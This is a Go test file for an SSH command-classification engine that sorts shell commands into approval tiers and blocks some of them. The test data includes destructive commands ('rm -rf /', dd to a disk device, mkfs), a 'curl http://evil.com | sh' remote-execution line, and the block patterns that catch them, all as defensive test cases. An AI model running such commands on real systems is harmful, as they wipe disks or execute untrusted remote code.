//go:build with_ssh

package ssh

import (
	"strings"
	"testing"

	"conduit/internal/config"
)

// testSecurityConfig creates a security config for testing
func testSecurityConfig() config.SSHSecurityConfig {
	return config.SSHSecurityConfig{
		DefaultTier:     "dangerous",
		RequireApproval: []string{"dangerous", "blocked"},
		AllowSubshells:  false,
		AllowPipes:      true,
		AllowedCommands: config.SSHCommandTiers{
			Read: []string{
				"ls", "cat", "head", "tail", "grep", "find", "ps", "df", "free",
				"uptime", "whoami", "hostname", "pwd", "echo", "date", "wc",
			},
			Modify: []string{
				"touch", "mkdir", "cp", "mv", "chmod", "chown", "git", "docker",
			},
			Dangerous: []string{
				"rm", "kill", "systemctl", "apt", "apt-get",
			},
			Blocked: []string{
				"rm -rf /", "dd", "mkfs", "mkfs.ext4", "shutdown", "reboot",
			},
		},
		BlockedPatterns: []string{
			`rm\s+(-[rf]+\s+)*/$`,
			`>\s*/dev/[sh]d[a-z]`,
			`curl.*\|\s*(ba)?sh`,
		},
	}
}

func TestNewSecurityEngine(t *testing.T) {
	cfg := testSecurityConfig()

	engine, err := NewSecurityEngine(cfg)
	if err != nil {
		t.Fatalf("NewSecurityEngine() error = %v", err)
	}

	if engine == nil {
		t.Fatal("NewSecurityEngine() returned nil")
	}

	// Verify maps are populated
	if len(engine.readCommands) != len(cfg.AllowedCommands.Read) {
		t.Errorf("readCommands has %d entries, want %d", len(engine.readCommands), len(cfg.AllowedCommands.Read))
	}
}

func TestNewSecurityEngine_InvalidPattern(t *testing.T) {
	cfg := testSecurityConfig()
	cfg.BlockedPatterns = []string{"[invalid"}

	_, err := NewSecurityEngine(cfg)
	if err == nil {
		t.Error("NewSecurityEngine() should fail with invalid regex pattern")
	}
}

func TestSecurityEngine_ClassifyCommand_ReadTier(t *testing.T) {
	engine, _ := NewSecurityEngine(testSecurityConfig())

	tests := []struct {
		command string
		wantCmd string
	}{
		{"ls", "ls"},
		{"ls -la", "ls"},
		{"ls -la /tmp", "ls"},
		{"cat /etc/hosts", "cat"},
		{"head -n 10 file.txt", "head"},
		{"tail -f /var/log/syslog", "tail"},
		{"grep pattern file.txt", "grep"},
		{"ps aux", "ps"},
		{"df -h", "df"},
		{"free -m", "free"},
		{"uptime", "uptime"},
		{"whoami", "whoami"},
		{"hostname", "hostname"},
		{"pwd", "pwd"},
		{"echo hello", "echo"},
		{"date", "date"},
	}

	for _, tt := range tests {
		t.Run(tt.command, func(t *testing.T) {
			result := engine.ClassifyCommand(tt.command)

			if result.Tier != TierRead {
				t.Errorf("ClassifyCommand(%q) tier = %s, want %s", tt.command, result.Tier, TierRead)
			}
			if result.BaseCommand != tt.wantCmd {
				t.Errorf("ClassifyCommand(%q) baseCommand = %s, want %s", tt.command, result.BaseCommand, tt.wantCmd)
			}
			if result.RequiresApproval {
				t.Errorf("ClassifyCommand(%q) should not require approval for read tier", tt.command)
			}
		})
	}
}

func TestSecurityEngine_ClassifyCommand_ModifyTier(t *testing.T) {
	engine, _ := NewSecurityEngine(testSecurityConfig())

	tests := []struct {
		command string
		wantCmd string
	}{
		{"touch newfile.txt", "touch"},
		{"mkdir newdir", "mkdir"},
		{"cp source dest", "cp"},
		{"mv oldname newname", "mv"},
		{"chmod 644 file.txt", "chmod"},
		{"chown user:group file.txt", "chown"},
		{"git status", "git"},
		{"git commit -m 'test'", "git"},
		{"docker ps", "docker"},
	}

	for _, tt := range tests {
		t.Run(tt.command, func(t *testing.T) {
			result := engine.ClassifyCommand(tt.command)

			if result.Tier != TierModify {
				t.Errorf("ClassifyCommand(%q) tier = %s, want %s", tt.command, result.Tier, TierModify)
			}
			if result.BaseCommand != tt.wantCmd {
				t.Errorf("ClassifyCommand(%q) baseCommand = %s, want %s", tt.command, result.BaseCommand, tt.wantCmd)
			}
		})
	}
}

func TestSecurityEngine_ClassifyCommand_DangerousTier(t *testing.T) {
	engine, _ := NewSecurityEngine(testSecurityConfig())

	tests := []struct {
		command string
		wantCmd string
	}{
		{"rm file.txt", "rm"},
		{"rm -f file.txt", "rm"},
		{"kill 1234", "kill"},
		{"systemctl restart nginx", "systemctl"},
		{"apt update", "apt"},
		{"apt-get install package", "apt-get"},
	}

	for _, tt := range tests {
		t.Run(tt.command, func(t *testing.T) {
			result := engine.ClassifyCommand(tt.command)

			if result.Tier != TierDangerous {
				t.Errorf("ClassifyCommand(%q) tier = %s, want %s", tt.command, result.Tier, TierDangerous)
			}
			if result.BaseCommand != tt.wantCmd {
				t.Errorf("ClassifyCommand(%q) baseCommand = %s, want %s", tt.command, result.BaseCommand, tt.wantCmd)
			}
			if !result.RequiresApproval {
				t.Errorf("ClassifyCommand(%q) should require approval for dangerous tier", tt.command)
			}
		})
	}
}

func TestSecurityEngine_ClassifyCommand_BlockedTier(t *testing.T) {
	engine, _ := NewSecurityEngine(testSecurityConfig())

	tests := []struct {
		command string
		reason  string
	}{
		{"rm -rf /", "explicitly blocked"},
		{"dd if=/dev/zero of=/dev/sda", "blocked pattern"},
		{"mkfs.ext4 /dev/sdb1", "explicitly blocked"},
		{"shutdown -h now", "explicitly blocked"},
		{"reboot", "explicitly blocked"},
	}

	for _, tt := range tests {
		t.Run(tt.command, func(t *testing.T) {
			result := engine.ClassifyCommand(tt.command)

			if result.Tier != TierBlocked {
				t.Errorf("ClassifyCommand(%q) tier = %s, want %s", tt.command, result.Tier, TierBlocked)
			}
			if !result.Blocked {
				t.Errorf("ClassifyCommand(%q) should be blocked", tt.command)
			}
		})
	}
}

func TestSecurityEngine_ClassifyCommand_UnknownCommands(t *testing.T) {
	engine, _ := NewSecurityEngine(testSecurityConfig())

	tests := []string{
		"unknowncommand",
		"some-random-tool --flag",
		"./custom-script.sh",
		"/usr/local/bin/mytool",
	}

	for _, cmd := range tests {
		t.Run(cmd, func(t *testing.T) {
			result := engine.ClassifyCommand(cmd)

			// Unknown commands should default to dangerous (as per config)
			if result.Tier != TierDangerous {
				t.Errorf("ClassifyCommand(%q) tier = %s, want %s (default tier)", cmd, result.Tier, TierDangerous)
			}
			if !result.RequiresApproval {
				t.Errorf("ClassifyCommand(%q) should require approval as unknown command", cmd)
			}
		})
	}
}

func TestSecurityEngine_ClassifyCommand_Subshells(t *testing.T) {
	engine, _ := NewSecurityEngine(testSecurityConfig())

	tests := []struct {
		command     string
		hasSubshell bool
	}{
		{"echo $(whoami)", true},
		{"echo `hostname`", true},
		{"ls $(pwd)", true},
		{"echo hello", false},
		{"echo 'no $(subshell) here'", false}, // Inside quotes is tricky
		{"echo \"$(date)\"", true},
	}

	for _, tt := range tests {
		t.Run(tt.command, func(t *testing.T) {
			result := engine.ClassifyCommand(tt.command)

			if result.HasSubshell != tt.hasSubshell {
				t.Errorf("ClassifyCommand(%q) hasSubshell = %v, want %v", tt.command, result.HasSubshell, tt.hasSubshell)
			}

			// With AllowSubshells=false, subshells should be blocked
			if tt.hasSubshell && !result.Blocked {
				t.Errorf("ClassifyCommand(%q) should be blocked (subshells not allowed)", tt.command)
			}
		})
	}
}

func TestSecurityEngine_ClassifyCommand_SubshellsAllowed(t *testing.T) {
	cfg := testSecurityConfig()
	cfg.AllowSubshells = true
	engine, _ := NewSecurityEngine(cfg)

	result := engine.ClassifyCommand("echo $(whoami)")

	if result.Blocked {
		t.Error("ClassifyCommand() should not block subshells when AllowSubshells=true")
	}
	if !result.HasSubshell {
		t.Error("ClassifyCommand() should detect subshell")
	}
}

func TestSecurityEngine_ClassifyCommand_PipeChains(t *testing.T) {
	engine, _ := NewSecurityEngine(testSecurityConfig())

	tests := []struct {
		command   string
		pipeCount int
		wantTier  SecurityTier
	}{
		{"ls | grep test", 2, TierRead},
		{"ps aux | grep nginx | head", 3, TierRead},
		{"cat file | rm -f", 2, TierDangerous}, // worst tier wins
		{"ls | wc -l", 2, TierRead},
		{"find . -name '*.go'", 1, TierRead}, // no pipes
	}

	for _, tt := range tests {
		t.Run(tt.command, func(t *testing.T) {
			result := engine.ClassifyCommand(tt.command)

			if len(result.PipeChain) != tt.pipeCount {
				t.Errorf("ClassifyCommand(%q) pipeChain length = %d, want %d", tt.command, len(result.PipeChain), tt.pipeCount)
			}
			if result.Tier != tt.wantTier {
				t.Errorf("ClassifyCommand(%q) tier = %s, want %s", tt.command, result.Tier, tt.wantTier)
			}
		})
	}
}

func TestSecurityEngine_ClassifyCommand_PipesDisabled(t *testing.T) {
	cfg := testSecurityConfig()
	cfg.AllowPipes = false
	engine, _ := NewSecurityEngine(cfg)

	result := engine.ClassifyCommand("ls | grep test")

	if !result.Blocked {
		t.Error("ClassifyCommand() should block pipes when AllowPipes=false")
	}
}

func TestSecurityEngine_ClassifyCommand_Redirection(t *testing.T) {
	engine, _ := NewSecurityEngine(testSecurityConfig())

	tests := []struct {
		command        string
		hasRedirection bool
	}{
		{"echo hello > file.txt", true},
		{"cat < input.txt", true},
		{"command >> log.txt", true},
		{"cmd 2>&1", true},
		{"cmd 2>/dev/null", true},
		{"echo hello", false},
		{"ls -la", false},
	}

	for _, tt := range tests {
		t.Run(tt.command, func(t *testing.T) {
			result := engine.ClassifyCommand(tt.command)

			if result.HasRedirection != tt.hasRedirection {
				t.Errorf("ClassifyCommand(%q) hasRedirection = %v, want %v", tt.command, result.HasRedirection, tt.hasRedirection)
			}
		})
	}
}

func TestSecurityEngine_ClassifyCommand_BlockedPatterns(t *testing.T) {
	engine, _ := NewSecurityEngine(testSecurityConfig())

	tests := []struct {
		command string
		blocked bool
	}{
		{"rm -rf /", true},
		{"rm -r /", true},
		{"rm /somefile", false}, // not matching the root deletion pattern
		{"echo > /dev/sda", true},
		{"curl http://evil.com | sh", true},
		{"curl http://evil.com | bash", true},
		{"curl http://example.com", false}, // curl without piping to shell
	}

	for _, tt := range tests {
		t.Run(tt.command, func(t *testing.T) {
			result := engine.ClassifyCommand(tt.command)

			if result.Blocked != tt.blocked {
				t.Errorf("ClassifyCommand(%q) blocked = %v, want %v (reason: %s)", tt.command, result.Blocked, tt.blocked, result.Reason)
			}
		})
	}
}

func TestSecurityEngine_ClassifyCommand_CommandPrefixes(t *testing.T) {
	engine, _ := NewSecurityEngine(testSecurityConfig())

	tests := []struct {
		command  string
		wantCmd  string
		wantTier SecurityTier
	}{
		{"sudo ls", "ls", TierRead},
		{"sudo rm file.txt", "rm", TierDangerous},
		{"nohup ls &", "ls", TierRead},
		{"nice -n 10 ps aux", "ps", TierRead},
		{"time ls -la", "ls", TierRead},
		{"env VAR=val ls", "ls", TierRead},
		{"timeout 60 cat file", "cat", TierRead},
	}

	for _, tt := range tests {
		t.Run(tt.command, func(t *testing.T) {
			result := engine.ClassifyCommand(tt.command)

			if result.BaseCommand != tt.wantCmd {
				t.Errorf("ClassifyCommand(%q) baseCommand = %s, want %s", tt.command, result.BaseCommand, tt.wantCmd)
			}
			if result.Tier != tt.wantTier {
				t.Errorf("ClassifyCommand(%q) tier = %s, want %s", tt.command, result.Tier, tt.wantTier)
			}
		})
	}
}

func TestSecurityEngine_ClassifyCommand_PathCommands(t *testing.T) {
	engine, _ := NewSecurityEngine(testSecurityConfig())

	tests := []struct {
		command string
		wantCmd string
	}{
		{"/bin/ls", "ls"},
		{"/usr/bin/cat file.txt", "cat"},
		{"./ls", "ls"},
		{"../bin/ps", "ps"},
	}

	for _, tt := range tests {
		t.Run(tt.command, func(t *testing.T) {
			result := engine.ClassifyCommand(tt.command)

			if result.BaseCommand != tt.wantCmd {
				t.Errorf("ClassifyCommand(%q) baseCommand = %s, want %s", tt.command, result.BaseCommand, tt.wantCmd)
			}
		})
	}
}

func TestSecurityEngine_ClassifyCommand_DangerousArgs(t *testing.T) {
	engine, _ := NewSecurityEngine(testSecurityConfig())

	tests := []struct {
		command  string
		wantTier SecurityTier
		reason   string
	}{
		// rm with flags
		{"rm file.txt", TierDangerous, "rm is dangerous"},
		{"rm -r dir/", TierDangerous, "rm -r is dangerous"},
		{"rm -rf dir/", TierDangerous, "rm -rf is dangerous"},

		// chmod dangerous patterns
		{"chmod 644 file.txt", TierModify, "normal chmod is modify"},
		{"chmod 777 file.txt", TierDangerous, "chmod 777 is dangerous"},
		{"chmod -R 755 dir/", TierDangerous, "recursive chmod is dangerous"},

		// chown dangerous patterns
		{"chown user file.txt", TierModify, "normal chown is modify"},
		{"chown -R user dir/", TierDangerous, "recursive chown is dangerous"},

		// git dangerous operations
		{"git status", TierModify, "git status is modify"},
		{"git commit -m 'test'", TierModify, "git commit is modify"},
		{"git reset --hard", TierDangerous, "git reset --hard is dangerous"},
		{"git push --force", TierDangerous, "git push --force is dangerous"},

		// docker dangerous operations
		{"docker ps", TierModify, "docker ps is modify"},
		{"docker rm -f container", TierDangerous, "docker rm -f is dangerous"},
		{"docker system prune", TierDangerous, "docker system prune is dangerous"},
	}

	for _, tt := range tests {
		t.Run(tt.command, func(t *testing.T) {
			result := engine.ClassifyCommand(tt.command)

			if result.Tier != tt.wantTier {
				t.Errorf("ClassifyCommand(%q) tier = %s, want %s (%s)", tt.command, result.Tier, tt.wantTier, tt.reason)
			}
		})
	}
}

func TestSecurityEngine_ClassifyCommand_MaxLength(t *testing.T) {
	cfg := testSecurityConfig()
	cfg.MaxCommandLength = 100
	engine, _ := NewSecurityEngine(cfg)

	// Create a command that exceeds max length
	longCommand := "echo " + strings.Repeat("x", 200)

	result := engine.ClassifyCommand(longCommand)

	if !result.Blocked {
		t.Error("ClassifyCommand() should block commands exceeding max length")
	}
	if !strings.Contains(result.Reason, "exceeds maximum length") {
		t.Errorf("ClassifyCommand() reason = %s, should mention max length", result.Reason)
	}
}

func TestSecurityEngine_ValidateCommandForHost(t *testing.T) {
	engine, _ := NewSecurityEngine(testSecurityConfig())

	tests := []struct {
		command     string
		hostTier    string
		wantBlocked bool
	}{
		// Read command on read-tier host
		{"ls -la", "read", false},
		// Modify command on read-tier host
		{"touch file.txt", "read", true},
		// Dangerous command on modify-tier host
		{"rm file.txt", "modify", true},
		// Read command on any tier
		{"ls", "dangerous", false},
		{"ls", "modify", false},
		// Dangerous command on dangerous-tier host
		{"rm file.txt", "dangerous", false},
	}

	for _, tt := range tests {
		t.Run(tt.command+"_"+tt.hostTier, func(t *testing.T) {
			result := engine.ValidateCommandForHost(tt.command, tt.hostTier)

			if result.Blocked != tt.wantBlocked {
				t.Errorf("ValidateCommandForHost(%q, %q) blocked = %v, want %v", tt.command, tt.hostTier, result.Blocked, tt.wantBlocked)
			}
		})
	}
}

func TestSecurityEngine_IsSafeForUnattendedExecution(t *testing.T) {
	engine, _ := NewSecurityEngine(testSecurityConfig())

	tests := []struct {
		command  string
		wantSafe bool
	}{
		{"ls -la", true},
		{"cat /etc/hosts", true},
		{"rm file.txt", false},    // dangerous tier
		{"touch file.txt", false}, // modify tier (not read)
		{"unknowncommand", false}, // unknown = dangerous
	}

	for _, tt := range tests {
		t.Run(tt.command, func(t *testing.T) {
			result := engine.ClassifyCommand(tt.command)
			safe := engine.IsSafeForUnattendedExecution(result)

			if safe != tt.wantSafe {
				t.Errorf("IsSafeForUnattendedExecution(%q) = %v, want %v (tier: %s)", tt.command, safe, tt.wantSafe, result.Tier)
			}
		})
	}
}

func TestSecurityEngine_GetSecuritySummary(t *testing.T) {
	engine, _ := NewSecurityEngine(testSecurityConfig())

	summary := engine.GetSecuritySummary()

	if summary == "" {
		t.Error("GetSecuritySummary() returned empty string")
	}

	// Check that key information is present
	expectedContents := []string{
		"Default tier",
		"Require approval",
		"Allow subshells",
		"Allow pipes",
		"Read commands",
	}

	for _, expected := range expectedContents {
		if !strings.Contains(summary, expected) {
			t.Errorf("GetSecuritySummary() missing %q", expected)
		}
	}
}

func TestSecurityEngine_QuotedPipes(t *testing.T) {
	engine, _ := NewSecurityEngine(testSecurityConfig())

	tests := []struct {
		command   string
		pipeCount int
	}{
		{"echo 'hello | world'", 1},    // pipe inside single quotes
		{`echo "hello | world"`, 1},    // pipe inside double quotes
		{"echo hello | grep hello", 2}, // real pipe
		{"echo 'a | b' | grep a", 2},   // mix of quoted and real pipe
	}

	for _, tt := range tests {
		t.Run(tt.command, func(t *testing.T) {
			result := engine.ClassifyCommand(tt.command)

			if len(result.PipeChain) != tt.pipeCount {
				t.Errorf("ClassifyCommand(%q) pipeChain = %v (len %d), want len %d", tt.command, result.PipeChain, len(result.PipeChain), tt.pipeCount)
			}
		})
	}
}

func TestTierSeverity(t *testing.T) {
	tests := []struct {
		tier     SecurityTier
		severity int
	}{
		{TierRead, 1},
		{TierModify, 2},
		{TierDangerous, 3},
		{TierBlocked, 4},
		{SecurityTier("unknown"), 4}, // Unknown treated as blocked
	}

	for _, tt := range tests {
		t.Run(string(tt.tier), func(t *testing.T) {
			if got := tierSeverity(tt.tier); got != tt.severity {
				t.Errorf("tierSeverity(%s) = %d, want %d", tt.tier, got, tt.severity)
			}
		})
	}
}

func TestNormalizeWhitespace(t *testing.T) {
	tests := []struct {
		input    string
		expected string
	}{
		{"hello world", "hello world"},
		{"hello  world", "hello world"},
		{"  hello  world  ", "hello world"},
		{"hello\tworld", "hello world"},
		{"hello\n\nworld", "hello world"},
		{"", ""},
		{"   ", ""},
	}

	for _, tt := range tests {
		t.Run(tt.input, func(t *testing.T) {
			if got := normalizeWhitespace(tt.input); got != tt.expected {
				t.Errorf("normalizeWhitespace(%q) = %q, want %q", tt.input, got, tt.expected)
			}
		})
	}
}

func TestExtractBaseCommand(t *testing.T) {
	engine, _ := NewSecurityEngine(testSecurityConfig())

	tests := []struct {
		command  string
		expected string
	}{
		{"ls", "ls"},
		{"ls -la", "ls"},
		{"/bin/ls", "ls"},
		{"/usr/bin/cat", "cat"},
		{"sudo ls", "ls"},
		{"sudo /bin/ls", "ls"},
		{"env VAR=val ls", "ls"},
		{"env VAR=val VAR2=val2 ls", "ls"},
		{"nohup ls &", "ls"},
		{"time nice ls", "ls"},
		{"", ""},
		{"sudo", "sudo"}, // just prefix is the command itself
	}

	for _, tt := range tests {
		t.Run(tt.command, func(t *testing.T) {
			if got := engine.extractBaseCommand(tt.command); got != tt.expected {
				t.Errorf("extractBaseCommand(%q) = %q, want %q", tt.command, got, tt.expected)
			}
		})
	}
}

// Benchmark tests
func BenchmarkClassifyCommand_Simple(b *testing.B) {
	engine, _ := NewSecurityEngine(testSecurityConfig())

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		engine.ClassifyCommand("ls -la")
	}
}

func BenchmarkClassifyCommand_PipeChain(b *testing.B) {
	engine, _ := NewSecurityEngine(testSecurityConfig())

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		engine.ClassifyCommand("ps aux | grep nginx | head -10")
	}
}

func BenchmarkClassifyCommand_PatternMatching(b *testing.B) {
	engine, _ := NewSecurityEngine(testSecurityConfig())

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		engine.ClassifyCommand("rm -rf /some/path")
	}
}
